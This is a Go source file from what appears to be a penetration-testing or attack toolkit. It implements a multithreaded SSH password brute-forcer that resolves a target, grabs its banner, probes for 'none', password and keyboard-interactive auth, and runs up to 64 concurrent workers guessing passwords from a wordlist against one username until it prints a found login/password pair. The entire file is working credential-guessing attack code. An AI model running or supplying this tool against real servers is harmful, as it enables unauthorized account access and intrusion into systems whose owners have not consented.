package ssh

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	foundTag = "\x1b[32m"

	// TASKS=16, MAXTASKS=64, WAITTIME=32.
	defaultTasks = 16
	maxTasks     = 64
	defaultWait  = 32 * time.Second
)

// Bruter guesses SSH passwords for one username.
// Stdlib-only SSH transport.;
type Bruter struct {
	Target   string
	Port     int
	Username string
	PassList string
	Threads  int // TASKS (default 16, max 64)
	Timeout  time.Duration
	Out      io.Writer
}

// Run tries each password from --passlist against --username on --target.
func (b *Bruter) Run() error {
	host := strings.TrimSpace(b.Target)
	user := strings.TrimSpace(b.Username)
	passFile := strings.TrimSpace(b.PassList)
	if host == "" {
		return fmt.Errorf("--ssh --brute requires --target <ip>")
	}
	if user == "" {
		return fmt.Errorf("--ssh --brute requires --username <user>")
	}
	if passFile == "" {
		return fmt.Errorf("--ssh --brute requires --passlist <file>")
	}

	passwords, err := readPassList(passFile)
	if err != nil {
		return err
	}
	if len(passwords) == 0 {
		return fmt.Errorf("passlist is empty: %s", passFile)
	}

	port := b.Port
	if port <= 0 {
		port = defaultPort
	}
	tasks := b.Threads
	if tasks <= 0 {
		tasks = defaultTasks
	}
	if tasks > maxTasks {
		tasks = maxTasks
	}
	if tasks > len(passwords) {
		tasks = len(passwords)
	}
	timeout := b.Timeout
	if timeout <= 0 {
		timeout = defaultWait
	}
	out := b.Out
	if out == nil {
		out = os.Stdout
	}

	ip := net.ParseIP(host)
	if ip == nil {
		addrs, err := net.LookupIP(host)
		if err != nil || len(addrs) == 0 {
			return fmt.Errorf("resolve %q: %w", host, err)
		}
		ip = addrs[0]
	}
	addr := net.JoinHostPort(ip.String(), fmt.Sprintf("%d", port))

	fmt.Fprintf(out, "%s Target: %s  User: %s  Passwords: %d  Threads: %d\n",
		sshTag, addr, user, len(passwords), tasks)

	// Identification grab before auth probing.
	if banner, err := GrabBanner(ip.String(), port, timeout); err == nil && banner != "" {
		fmt.Fprintf(out, "%s Banner: %s\n", sshTag, banner)
	}

	// Oone probe that password / kbd-int is available.
	methods, err := probeAuthMethods(addr, user, timeout)
	if err != nil {
		return err
	}
	if hasAuthMethod(methods, "none") {
		fmt.Fprintf(out, "- %sFound login (no password required): %s\x1b[0m\n", foundTag, user)
		return nil
	}
	if !hasAuthMethod(methods, "password") && !hasAuthMethod(methods, "keyboard-interactive") {
		return fmt.Errorf("ssh target does not support password or keyboard-interactive auth (methods: %s)",
			strings.Join(methods, ", "))
	}
	fmt.Fprintf(out, "%s Auth methods: %s\n", sshTag, strings.Join(methods, ", "))

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	jobs := make(chan string, tasks*2)
	var found atomic.Bool
	var foundPass atomic.Value
	var wg sync.WaitGroup
	authMethods := append([]string(nil), methods...)

	// Each worker is one child task: own SSH session, reuse after
	// AUTH_FAILURE, new session after AUTH_ERROR / disconnect.
	worker := func() {
		defer wg.Done()
		var sess *transport
		taskMethods := append([]string(nil), authMethods...)
		newSession := true
		defer func() {
			if sess != nil && sess.conn != nil {
				_ = sess.conn.Close()
			}
		}()

		openSession := func() error {
			if sess != nil && sess.conn != nil {
				_ = sess.conn.Close()
				sess = nil
			}
			tr, err := dialKex(addr, timeout)
			if err != nil {
				return err
			}
			m, err := tr.listAuthMethods(user)
			if err != nil {
				_ = tr.conn.Close()
				return err
			}
			m = trimMethods(m)
			if len(m) > 0 {
				taskMethods = m
			}
			if hasAuthMethod(m, "none") {
				if found.CompareAndSwap(false, true) {
					foundPass.Store("")
					cancel()
				}
				_ = tr.conn.Close()
				return fmt.Errorf("none auth")
			}
			sess = tr
			newSession = false
			return nil
		}

		for {
			select {
			case <-ctx.Done():
				return
			case pass, ok := <-jobs:
				if !ok {
					return
				}
				if found.Load() {
					return
				}

				if newSession || sess == nil {
					if err := openSession(); err != nil {
						newSession = true
						continue
					}
				}

				_ = sess.conn.SetDeadline(time.Now().Add(timeout))
				okAuth, err := sess.tryAuth(user, pass, taskMethods)
				if err != nil {
					// SSH_AUTH_ERROR or !ssh_is_connected → new_session=1
					newSession = true
					if sess != nil && sess.conn != nil {
						_ = sess.conn.Close()
						sess = nil
					}
					continue
				}
				if okAuth {
					if found.CompareAndSwap(false, true) {
						foundPass.Store(pass)
						cancel()
					}
					return
				}
				// AUTH_FAILURE, same login → reuse session
				newSession = false
			}
		}
	}

	wg.Add(tasks)
	for i := 0; i < tasks; i++ {
		go worker()
	}
	go func() {
		defer close(jobs)
		for _, pass := range passwords {
			select {
			case <-ctx.Done():
				return
			case jobs <- pass:
			}
		}
	}()
	wg.Wait()

	if found.Load() {
		pass, _ := foundPass.Load().(string)
		if pass == "" {
			fmt.Fprintf(out, "- %sFound login (no password required): %s\x1b[0m\n", foundTag, user)
			return nil
		}
		fmt.Fprintf(out, "- %sFound login/password pair: %s / %s\x1b[0m\n", foundTag, user, pass)
		return nil
	}
	fmt.Fprintf(out, "%s No valid password found for user %q\n", sshTag, user)
	return nil
}

func probeAuthMethods(addr, user string, timeout time.Duration) ([]string, error) {
	var lastErr error
	for attempt := 0; attempt < 3; attempt++ {
		tr, err := dialKex(addr, timeout)
		if err != nil {
			lastErr = err
			time.Sleep(time.Duration(attempt+1) * 200 * time.Millisecond)
			continue
		}
		methods, err := tr.listAuthMethods(user)
		_ = tr.conn.Close()
		if err == nil {
			return trimMethods(methods), nil
		}
		lastErr = err
		time.Sleep(time.Duration(attempt+1) * 200 * time.Millisecond)
	}
	return nil, fmt.Errorf("auth probe: %w", lastErr)
}

func readPassList(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("open passlist: %w", err)
	}
	defer f.Close()
	var out []string
	seen := make(map[string]bool)
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !seen[line] {
			seen[line] = true
			out = append(out, line)
		}
	}
	if err := sc.Err(); err != nil {
		return nil, fmt.Errorf("read passlist: %w", err)
	}
	return out, nil
}
